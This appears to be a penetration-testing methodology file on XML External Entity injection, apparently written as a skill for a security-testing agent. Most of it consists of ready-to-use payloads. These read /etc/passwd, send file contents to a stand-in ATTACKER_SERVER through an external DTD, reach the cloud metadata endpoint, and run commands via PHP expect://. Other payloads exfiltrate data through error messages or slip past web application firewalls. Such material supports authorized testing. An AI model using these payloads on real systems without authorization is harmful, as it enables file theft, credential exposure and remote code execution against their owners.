---
name: xxe
description: XML External Entity injection, blind XXE, file exfiltration
applicable_contexts: [web, api, file_upload]
---

## XXE Testing Methodology

### Classic XXE (In-Band)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### Blind XXE (Out-of-Band)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://ATTACKER_SERVER/xxe.dtd">
  %ext;
]>
<root><data>test</data></root>
```

External DTD (`xxe.dtd` on attacker server):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%eval;
%exfil;
```

### XXE via File Upload

- **SVG**: `<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`
- **DOCX/XLSX**: unzip → modify `[Content_Types].xml` or `word/document.xml` → rezip
- **PDF (XMP metadata)**: inject entity in metadata fields
- **SOAP**: inject in SOAP XML body

### XXE to SSRF

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### XXE to RCE (PHP expect)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://whoami">
]>
<root>&xxe;</root>
```

### Error-Based XXE (data exfil via errors)

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

### Detection via Content-Type

- Change `Content-Type: application/json` → `Content-Type: application/xml`
- Some frameworks auto-parse XML if Content-Type header requests it
- Test: send XML body to JSON endpoints

### Bypass Techniques

- UTF-7/UTF-16 encoding to bypass WAF pattern matching
- Parameter entities (`%entity;`) when general entities blocked
- XInclude: `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>`
- HTML entities in attribute values

### Validation Requirements

- Show file content extracted (mask sensitive data)
- For blind XXE: show OOB callback with exfiltrated data
- Document Content-Type and endpoint that processes XML
- Demonstrate SSRF reach if cloud metadata accessible
- Confirm parser type (libxml2, Xerces, etc.) if possible

### Business Impact

- Local file read (configuration files, source code, credentials)
- SSRF to internal services via XXE
- Denial of service (billion laughs attack)
- Remote code execution (PHP expect://, jar:// protocol)
